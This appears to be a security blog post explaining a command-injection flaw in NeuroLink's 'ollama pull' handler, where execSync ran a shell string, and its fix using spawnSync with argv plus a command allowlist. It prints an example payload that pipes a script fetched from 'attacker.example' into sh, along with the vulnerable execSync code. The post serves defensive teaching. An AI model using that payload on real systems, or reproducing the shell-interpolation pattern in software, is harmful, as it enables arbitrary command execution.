---
layout: post
title: 'Command injection in the ollama integration'
date: '2025-08-21 10:00:00 +0530'
categories:
  - Security
  - Engineering
tags:
  - security
  - ollama
  - cli
  - command-injection
  - child-process
author: neurolink
description: >-
  NeuroLink's ollama pull command built a shell string from an unvalidated
  model argument and ran it through execSync. Commit 27e6088aa replaced every
  execSync call in the ollama command surface with spawnSync over argv,
  closing the injection vector without a shell in between.
toc: true
mermaid: false
pin: false
image:
  path: /assets/img/posts/command-injection-in-the-ollama-integration/hero.png
  alt: 'Command injection in the ollama integration'
---

`neurolink ollama pull <model>` takes one argument and hands it to Ollama. For almost every real invocation, `<model>` is something like `llama2` or `codellama:13b`, and the command does exactly what it looks like it does. But the CLI parser does not know the difference between a model name and a string an attacker chose on purpose, and until commit `27e6088aa` (`fix(security): prevent command injection in ollama pull`, 2025-08-21), neither did the implementation that ran it.

The bug was not exotic. It was a template string handed to `execSync`, which is the classic shape of a shell-injection vulnerability in Node.js, and it sat in a code path whose whole job is to take a string from the command line and forward it toward a subprocess.

## The vulnerable line

Before the fix, `OllamaCommandFactory.pullModelHandler` in `src/cli/factories/ollamaCommandFactory.ts` did this:

```typescript
private static async pullModelHandler(argv: { model: string }) {
  const { model } = argv;
  logger.always(chalk.blue(`Downloading model: ${model}`));
  logger.always(chalk.gray("This may take several minutes..."));

  try {
    execSync(`ollama pull ${model}`, { stdio: "inherit" });
    logger.always(chalk.green(`\n✅ Successfully downloaded ${model}`));
    // ...
  } catch (error: unknown) {
    // ...
  }
}
```

`execSync` runs its argument through `/bin/sh -c` (or `cmd.exe` on Windows) by default. That means every character with meaning to the shell — `;`, `&&`, `|`, backticks, `$(...)` — is live inside `model` the moment it reaches this line. `model` comes straight from yargs' positional argument parsing with no allowlist, no regex check, and no escaping. Six other handlers in the same file had the identical shape: `listModelsHandler`, `removeModelHandler`, `statusHandler`, `startHandler`, `stopHandler`, and `setupHandler` all built a command with `execSync` and either string interpolation or a literal command string passed to a shell.

## What the injection actually looks like

Nobody has to be clever about this. `ollama pull` takes one positional argument on the CLI, and that argument is inserted into a shell command line unmodified. A model argument like:

```bash
neurolink ollama pull "llama2; curl http://attacker.example/x.sh | sh"
```

does not fail to parse as a model name and stop there — the shell that `execSync` spawns sees `ollama pull llama2`, a `;`, and then a second, completely independent command, and runs both. The visible symptom is that `ollama pull` "downloads llama2" while a second process runs unrelated to Ollama at all. Nothing in the pre-fix code distinguishes "a model name with an unfortunate character in it" from "a model name that is also a shell script."

This is the textbook failure mode `execSync`/`child_process.exec` are known for: they are a convenience wrapper around `sh -c "<your string>"`, and any code path that builds that string from external input is one unescaped semicolon away from arbitrary command execution with the privileges of the Node.js process. A CLI is not a lower-trust surface than a web form here — anything that constructs this argument programmatically (a script, a CI job, an agent wrapping the `neurolink` CLI) inherits the same exposure the moment the model string isn't a hardcoded literal.

## The fix: argv, not a string

The fix commit replaces the `execSync` import with `spawnSync` and adds a wrapper:

```typescript
import { spawnSync } from "child_process";
// ...

/**
 * Secure wrapper around spawnSync to prevent command injection.
 */
private static safeSpawn(command: string, args: string[], options: any = {}) {
  const allowedCommands = [
    "ollama",
    "curl",
    "systemctl",
    "pkill",
    "killall",
    "open",
    "taskkill",
    "start",
  ];
  if (!allowedCommands.includes(command)) {
    throw new Error(`[SECURE] Command not allowed: ${command}`);
  }
  return spawnSync(command, args, { encoding: "utf8", ...options });
}
```

And `pullModelHandler` becomes:

```typescript
private static async pullModelHandler(argv: { model: string }) {
  const { model } = argv;
  logger.always(chalk.blue(`Downloading model: ${model}`));
  logger.always(chalk.gray("This may take several minutes..."));

  try {
    const res = this.safeSpawn("ollama", ["pull", model], { stdio: "inherit" });
    if (res.error || res.status !== 0) throw res.error || new Error("pull failed");

    logger.always(chalk.green(`\n✅ Successfully downloaded ${model}`));
    // ...
  } catch (error: unknown) {
    // ...
  }
}
```

The mechanism that matters is `spawnSync(command, args, ...)` without a `shell: true` option. `spawnSync` invoked this way calls the OS `exec` family directly with `command` as the program and each entry of `args` as one argument, with no shell parsing step in between. `model` is now one element of an array, not a substring of a command line — the shell never sees it, so there is nothing for `;`, `|`, backticks, or `$(...)` to mean. The same string that broke out of the shell before — `"llama2; curl ... | sh"` — is now just a single (invalid) model name that `ollama pull` rejects, because it is passed to Ollama as `argv[1]`, literally, whitespace and all.

## Every call site, converted the same way

The commit does not stop at `pull`. Every remaining handler in `OllamaCommandFactory` — `listModelsHandler`, `removeModelHandler`, `statusHandler`, `startHandler`, `stopHandler`, `setupHandler` — moves its `execSync` calls to `safeSpawn`:

```typescript
// list-models
const res = this.safeSpawn("ollama", ["list"]);

// remove
const res = this.safeSpawn("ollama", ["rm", model]);

// status (plus an optional curl probe)
const res = this.safeSpawn("ollama", ["list"]);
const curlRes = this.safeSpawn("curl", ["-s", "http://localhost:11434/api/tags"]);

// start (platform-specific)
this.safeSpawn("open", ["-a", "Ollama"]);                 // macOS
this.safeSpawn("systemctl", ["start", "ollama"]);          // Linux
this.safeSpawn("start", ["ollama", "serve"], { shell: true }); // Windows

// stop
this.safeSpawn("pkill", ["ollama"]);
this.safeSpawn("killall", ["Ollama"]);
this.safeSpawn("systemctl", ["stop", "ollama"]);
this.safeSpawn("taskkill", ["/F", "/IM", "ollama.exe"]);

// setup
const res = this.safeSpawn("ollama", ["--version"]);
```

Only `model` ever came from user input across these call sites (in `pull` and `remove`); the rest of the arguments — `list`, `rm`, `--version`, `-a`, `Ollama` — are literals the code already controlled. But the fix is applied uniformly rather than only patching the one call the report presumably named, which is the right instinct: every `execSync` in the file had the same shell-interpolation shape, whether or not each one happened to carry attacker-controlled input yet.

Laid out handler by handler, the shape of the diff is the same eight times over — a shell string becomes a program name plus an argv array:

| Handler | Before (`execSync`) | After (`safeSpawn`) | User input in the command? |
| --- | --- | --- | --- |
| `listModelsHandler` | `execSync("ollama list", ...)` | `safeSpawn("ollama", ["list"])` | no |
| `pullModelHandler` | `` execSync(`ollama pull ${model}`, {stdio:"inherit"}) `` | `safeSpawn("ollama", ["pull", model], {stdio:"inherit"})` | **yes — `model`** |
| `removeModelHandler` | `` execSync(`ollama rm ${model}`, ...) `` | `safeSpawn("ollama", ["rm", model])` | **yes — `model`** |
| `statusHandler` | `execSync("ollama list", ...)` + `execSync("curl -s http://localhost:11434/api/tags", ...)` | `safeSpawn("ollama", ["list"])` + `safeSpawn("curl", ["-s", "http://localhost:11434/api/tags"])` | no |
| `startHandler` (macOS) | `execSync("open -a Ollama")` | `safeSpawn("open", ["-a", "Ollama"])` | no |
| `startHandler` (Linux) | `execSync("systemctl start ollama", ...)` | `safeSpawn("systemctl", ["start", "ollama"])` | no |
| `startHandler` (Windows) | `execSync("start ollama serve", {stdio:"ignore"})` | `safeSpawn("start", ["ollama", "serve"], {stdio:"ignore", shell:true})` | no |
| `stopHandler` | `execSync("pkill ollama")` / `execSync("killall Ollama")` / `execSync("systemctl stop ollama")` / `execSync("taskkill /F /IM ollama.exe")` | the matching `safeSpawn(...)` calls, one per platform branch | no |
| `setupHandler` | `execSync("ollama --version", ...)` | `safeSpawn("ollama", ["--version"])` | no |

The Windows branch of `startHandler` is the one exception worth flagging on its own: it still passes `shell: true`, because `start` is a `cmd.exe` builtin rather than a real executable on `PATH` and has to go through a shell to resolve at all. That call site never carries `model` or any other user-supplied string, though — every argument is a literal (`"ollama"`, `"serve"`) — so the shell it invokes has nothing attacker-controlled to parse. The two call sites that actually took a positional CLI argument, `pull` and `remove`, are both in the "no `shell: true`" majority.

## A second layer: the allowlist

`safeSpawn` does one more thing worth calling out on its own: it checks `command` — the program name, not the arguments — against a fixed list of eight strings before calling `spawnSync` at all. `ollama`, `curl`, `systemctl`, `pkill`, `killall`, `open`, `taskkill`, `start`. Anything else throws `[SECURE] Command not allowed: ${command}` and never reaches `spawnSync`.

This isn't the primary fix — the primary fix is "no shell, args as argv" — but it is defense in depth against a different mistake: a future call site that accidentally passes a user-controlled *program name* instead of a user-controlled *argument*. Given the six call sites above, every `command` argument passed to `safeSpawn` is a string literal chosen by the code, never `model` or any other argv-derived value, so the allowlist is currently redundant with the argv fix. It earns its keep the day someone adds a seventh call site and gets that distinction wrong.

## What `stdio: "inherit"` still means here

One thing the fix deliberately leaves alone: `pullModelHandler` still passes `{ stdio: "inherit" }` to `safeSpawn`, exactly as the old `execSync` call did. That option controls where the child process's stdin/stdout/stderr are connected — to the parent's own streams, so Ollama's download progress bar prints straight to the user's terminal — and it has nothing to do with how the *command itself* gets parsed. `stdio` was never the vulnerability; `sh -c` building the argument list from a template string was. Swapping `execSync` for `spawnSync` removes the shell step while leaving the terminal wiring identical, which is why the download UX is unchanged before and after this commit.

## The duplicate that turned out to be dead code

The same commit also adds a new file, `src/cli/commands/ollama.ts` — 361 lines, exporting `addOllamaCommands()` with its own copy of the six handlers, already written against `spawnSync` from the start. It's a second, parallel implementation of the same command group, fixed the same way, added in the same commit.

It never ran. `addOllamaCommands` was exported and never imported anywhere; the CLI's actual `ollama` subcommand was — and remained — wired through `OllamaCommandFactory`, registered from `commandFactory.ts`. A later cleanup commit, `chore(cli): delete the dead ollama command module`, confirms this in its own message: *"src/cli/commands/ollama.ts exported addOllamaCommands and nothing imported it. The live path is OllamaCommandFactory... The two were duplicates of each other and only one ran."* The file was removed a year later without anyone having to reconcile behavior between two live copies, because there was only ever one.

It's a useful reminder that "the fix landed" and "the fix shipped in the code path that executes" are different claims. In this case they happened to coincide — `OllamaCommandFactory` was the live path and it got the same fix as the dead file — but the commit's diff alone doesn't tell you which of two nearly-identical files is the one users actually invoke.

## The trust boundary this closes

It's worth being precise about what this fix does and doesn't change. The `model` argument was already coming from whoever invokes the `neurolink` CLI locally — this was never a remotely-triggerable vulnerability in the sense of an HTTP request reaching this code. What it closes is the gap between "a string that looks like a model name" and "a string the shell will execute as multiple commands." That gap matters most for exactly the callers who don't type the command by hand: a script that reads a model name out of a config file, a CI step that pulls a model named in an environment variable, or an agent that constructs `neurolink ollama pull <model>` programmatically from something it decided on its own. Any of those can turn an untrusted upstream value into a shell payload the moment it reaches `execSync`; none of them can do that against `spawnSync(command, args)` with no `shell: true`, because there's no shell grammar left to inject into.

## Verifying it yourself

The difference is observable without reading a diff. Against a build with the pre-fix `execSync` code, a model name that closes the initial command and starts a second one runs both:

```bash
# pre-fix: the shell sees "ollama pull test" AND a second command
neurolink ollama pull 'test; echo INJECTED'
# -> "INJECTED" prints, proving a second process ran
```

Against the fixed build, that same string is just an argv element passed to Ollama, not shell grammar:

```bash
# post-fix: the whole string is argv[1] to `ollama`, nothing is parsed as shell syntax
neurolink ollama pull 'test; echo INJECTED'
# -> ollama rejects "test; echo INJECTED" as a single, invalid model name;
#    "INJECTED" never prints, because no shell ever saw the semicolon
```

That's the entire before/after: same CLI surface, same argument, one version treats it as a command line and the other treats it as data. Nothing about the PoC requires special privileges or a malformed model name in Ollama's own sense — `test; echo INJECTED` is a perfectly well-formed shell command line and a nonsense model name at the same time, and the pre-fix code only ever looked at it as the former.

## Why the allowlist includes `curl` for a read-only request

One entry in `safeSpawn`'s allowlist is easy to skim past: `curl`, used only in `statusHandler` to `GET http://localhost:11434/api/tags` — Ollama's own local API, on a hardcoded URL, with no user input anywhere in the call. Nothing about that call site was ever exploitable through `model`, `argv`, or any other external input; the URL is a string literal in the source. It's included for the same reason the fix touched every handler and not just `pull`: the commit's fix is "no code path in this file invokes a shell with interpolated or externally influenced input," applied as a blanket property of the file rather than a per-call-site judgment call about which ones currently happen to be reachable by an attacker. A codebase is easier to reason about when the property holds everywhere than when it holds only at the specific line someone remembered to check.

## What changed later, without changing the shape of the fix

`spawnSync` blocks the Node.js event loop until the child exits, and the version of `safeSpawn` in this commit calls it with no `timeout` option — meaning an Ollama daemon that hangs (rather than erroring quickly) makes `neurolink ollama pull` unrecoverable short of killing the process, with no output and no error surfaced. That's a separate defect from command injection — it's a robustness gap, not a security one, and it was traded in on purpose: the pre-fix code had the same unbounded wait, just wrapped in `execSync` instead of `spawnSync`.

NeuroLink's `release` branch has since hardened the same call sites further. `safeSpawn` now carries an explicit bound, `OLLAMA_QUERY_TIMEOUT_MS = 15_000`, and the commit that added it — `fix(cli): bound the synchronous ollama and scanner subprocesses` — records why a plain `timeout` option wasn't enough on its own: *"`spawnSync`'s timeout sends SIGTERM and then keeps waiting, so against a child that ignores SIGTERM the call never returns and the timeout buys nothing. Measured: default SIGTERM never returned; with SIGKILL the call returned at 2.0s with ETIMEDOUT."* The current `safeSpawn` sets `killSignal: "SIGKILL"` for exactly that reason — a detail that only matters because someone measured what `SIGTERM` alone actually did against an unresponsive child, rather than assuming a timeout option is self-enforcing. The `command` parameter is also typed as an `AllowedCommand` union now, so the allowlist check that used to run against a plain `string[]` at runtime is partly enforced by the compiler instead. Neither later change touches the core fix from this commit — spawn over argv, no shell — it's still there, doing the same job it did in `27e6088aa`.

## The pattern to take away

`execSync`/`exec` build a shell command from a string; `spawnSync`/`spawn` (and their promise-based siblings) run a program directly from an argv array. The rule that falls out of this commit is simple and general: if any part of the command you're building comes from outside the function — a CLI argument, a config value, a network response — building that command as a template string for `exec`/`execSync` is the vulnerability, not a precursor to one. The fix is never "validate the string harder"; it's "stop asking a shell to parse it in the first place." `git show 27e6088aa -- src/cli/factories/ollamaCommandFactory.ts` is the smallest version of that lesson: six call sites, one wrapper, zero shell interpolation left in the file.

---

**Related posts:**

- [Running Local LLMs with NeuroLink and Ollama](/posts/ollama-local-llm-guide/)
- [LiteLLM + NeuroLink: Access 100+ Models via Unified Routing](/posts/litellm-unified-routing/)
